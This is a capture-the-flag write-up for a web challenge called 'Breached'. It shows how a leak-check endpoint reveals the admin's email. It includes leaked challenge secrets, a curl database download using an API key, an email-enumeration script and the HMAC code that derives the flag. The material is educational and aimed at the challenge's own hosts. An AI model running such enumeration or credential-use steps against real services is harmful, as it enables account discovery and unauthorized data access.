# Breached

> Challange Description:
> The admin email of Acme Surveys was leaked, but the identity of the admin is unknown. The objective was to identify the admin email using the provided leak-checking service and derive the flag through a cryptographic HMAC comparison implemented in the backend. The challenge highlights how auxiliary endpoints can undermine otherwise secure cryptographic constructions.

Title: "Breached"<br>
Date: "2025-11-29"<br>
Author: "scap3sh4rk"<br>
Tags: ["web", "endpoint-detection", "medium"]<br>
Read_time: "8 min read"<br>

---

## Challenge Metadata

- **Room Name:** breached
- **Platform:** IIT Bombay CTF 2025
- **URL:** https://asdasdasd
- **Difficulty:** Medium
- **Category:** Web
- **Points:** 200

---

## Introduction

This challenge revolves around identifying a hidden administrative identity and leveraging a cryptographic mechanism to derive the flag. The backend relies on HMAC-SHA256 to determine administrative privileges. An auxiliary API unintentionally leaks identifying metadata, enabling enumeration of the admin account.

## 1. Reconnaissance

Artifacts provided:

- Flask web application
- Docker environment
- `.env` file

```
FLAG_SECRET = 3HZ0jv5EuC4WHoJnxGKDxuoD9mCkxHMlJz3MucS6U40k7lLdqDqlF2pmeDRT2W5F
ADMIN_API_KEY = 6208d4e88be3d7a2c6845189a23954420f037a262d13a833b9ace3ef98a35ee0
```

Core validation condition:

```
HMAC_SHA256(FLAG_SECRET, email) == FLAG_TOKEN
```

### Passive Reconnaissance

- Reviewed Flask routes
- Inspected environment variables
- Analyzed token generation logic

### Active Reconnaissance

Leak-check endpoint:

```
https://tlctf2025-hibc.chals.io/check_email?email=<email>
```
<img width="1214" height="274" alt="image" src="https://github.com/user-attachments/assets/9c199a67-3779-4692-8cd2-2b07a0a59c01" />

Database download:

```bash
curl -s -H "X-API-Key: 6208d4e88be3d7a2c6845189a23954420f037a262d13a833b9ace3ef98a35ee0" https://tlctf2025-data-app.chals.io/download_db -o runtime_db.csv
```

---

## 2. Scanning and Enumeration

Typical response from `/check_email`:

```json
{
  "email": "test@acme.test",
  "plaintext_password": null,
  "pwned": false
}
```

Hypothesis:

The admin email would produce an anomalous response.

---

## 3. Gaining Access (Exploitation)

### Vulnerability Analysis

- HMAC logic was secure.
- Admin identity derived via HMAC comparison.
- Auxiliary endpoint leaked `pwned` metadata.
- Only one email returned `pwned: true`.

### Exploitation Steps

```python
import csv, requests

URL = "https://tlctf2025-hibc.chals.io/check_email"

with open("runtime_db.csv") as f:
    r = csv.DictReader(f)
    for row in r:
        email = row["email"]
        resp = requests.get(URL, params={"email": email})
        data = resp.json()

        if data.get("pwned") or data.get("plaintext_password") or data != {
            "email": email,
            "plaintext_password": None,
            "pwned": False
        }:
            print("ADMIN FOUND:", email)
            print(data)
            break
```

Result:

```
ADMIN FOUND: blake.baker20@acme.test
{"email": "blake.baker20@acme.test", "plaintext_password": null, "pwned": true}
```

<img width="1214" height="274" alt="image" src="https://github.com/user-attachments/assets/f5bc8cf6-e182-4f24-8131-5324eeaf99cd" />

---

## 4. Privilege Escalation

Not applicable. Identification of the correct email was sufficient.

---

## 5. Post-Exploitation & Loot

```python
import hmac, hashlib

SECRET = "3HZ0jv5EuC4WHoJnxGKDxuoD9mCkxHMlJz3MucS6U40k7lLdqDqlF2pmeDRT2W5F"
email  = "blake.baker20@acme.test"

token  = hmac.new(SECRET.encode(), email.encode(), hashlib.sha256).hexdigest()

print("FLAG: trustctf{" + token[:12] + "}")
```

---

## Conclusion

The weakness was not in cryptography but in metadata exposure through an auxiliary endpoint. Security failures often emerge from integration boundaries rather than core primitives.

> "Security fails at the boundaries, not the primitives." — scap3sh4rk

---

*writeup by @scap3sh4rk*
